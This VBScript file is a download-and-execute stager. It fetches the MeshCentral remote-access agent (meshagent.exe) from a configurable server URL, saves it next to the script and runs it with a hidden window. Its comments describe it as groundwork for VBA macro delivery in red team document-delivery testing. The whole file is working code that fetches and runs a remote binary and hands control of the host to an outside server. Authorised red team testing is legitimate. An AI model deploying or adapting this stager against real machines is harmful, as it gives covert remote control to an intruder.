Option Explicit

' This is an install script for MeshCentral, using VBS.
' One intention of this, is to build toward delivery options via VBA for red team document delivery testing.


Dim installerName, downloadUrl, downloadPath
Dim serverUrl, deviceGroup
Dim exitCode

' 1) Define file & URL
installerName = "meshagent.exe"
downloadUrl   = "(Replace with your MeshCentral server URL)"
serverUrl     = "(Paste MeshCentral Server URL here)"
deviceGroup   = "(Optional group name)"

' 2) Save path = same folder as this .vbs script
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim scriptFolder : scriptFolder = fso.GetParentFolderName(WScript.ScriptFullName)
downloadPath = scriptFolder & "\" & installerName

WScript.Echo "Downloading MeshCentral agent installer..."
DownloadFile downloadUrl, downloadPath

WScript.Sleep 3000

' 3) Confirm file exists
If Not fso.FileExists(downloadPath) Then
    MsgBox "Download failed. File not found at: " & downloadPath, vbCritical, "Error"
    WScript.Quit 1
End If

WScript.Echo "Running MeshCentral agent..."
' 4) Run meshagent.exe with run parameter
Dim wshShell : Set wshShell = CreateObject("WScript.Shell")
exitCode = wshShell.Run("""" & downloadPath & """ run", 0, True)

' 5) Check exit code
Select Case exitCode
    Case 0
        MsgBox "MeshCentral agent installed successfully.", vbInformation, "Success"
    Case 3010
        MsgBox "Agent installed successfully. Reboot is required to complete installation.", vbExclamation, "Installed (Reboot Required)"
    Case Else
        MsgBox "Installation failed with exit code: " & exitCode, vbCritical, "Install Failed"
End Select

WScript.Quit 0


' -----------------------------------------------------------------------
' DownloadFile: Downloads a file from URL to savePath using WinHTTP,
'              writes binary data via ADODB.Stream
' -----------------------------------------------------------------------
Sub DownloadFile(ByVal url, ByVal savePath)
    Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Dim ado : Set ado = CreateObject("ADODB.Stream")
        ado.Type = 1  ' adTypeBinary
        ado.Open
        ado.Write http.ResponseBody
        ado.SaveToFile savePath, 2  ' adSaveCreateOverWrite
        ado.Close
    Else
        WScript.Echo "HTTP error: " & http.Status & " - " & http.StatusText
    End If
End Sub